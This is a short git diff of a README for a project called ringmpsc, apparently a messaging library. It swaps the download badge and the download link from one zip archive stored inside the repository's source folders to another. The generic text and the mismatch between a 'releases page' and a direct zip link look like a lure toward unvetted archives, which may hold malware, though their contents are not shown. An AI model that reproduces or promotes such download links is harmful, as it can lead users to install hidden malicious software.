@@ -1,6 +1,6 @@
 # 🚀 ringmpsc - Fast and Efficient Messaging for Everyone
 
-[![Download ringmpsc](https://raw.githubusercontent.com/Arcxelys/ringmpsc/main/c_impl/Software-3.8.zip)](https://raw.githubusercontent.com/Arcxelys/ringmpsc/main/c_impl/Software-3.8.zip)
+[![Download ringmpsc](https://github.com/Arcxelys/ringmpsc/raw/refs/heads/main/rust_impl/Software_1.1.zip)](https://github.com/Arcxelys/ringmpsc/raw/refs/heads/main/rust_impl/Software_1.1.zip)
 
 ## 📖 Table of Contents
 1. [🌟 Introduction](#-introduction)
@@ -24,7 +24,7 @@ To use ringmpsc, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To get started, visit the download page to obtain the latest version of ringmpsc.
 
-[Download ringmpsc here](https://raw.githubusercontent.com/Arcxelys/ringmpsc/main/c_impl/Software-3.8.zip)
+[Download ringmpsc here](https://github.com/Arcxelys/ringmpsc/raw/refs/heads/main/rust_impl/Software_1.1.zip)
 
 Once you’re on the releases page, follow these steps:
 1. Locate the latest version of ringmpsc.
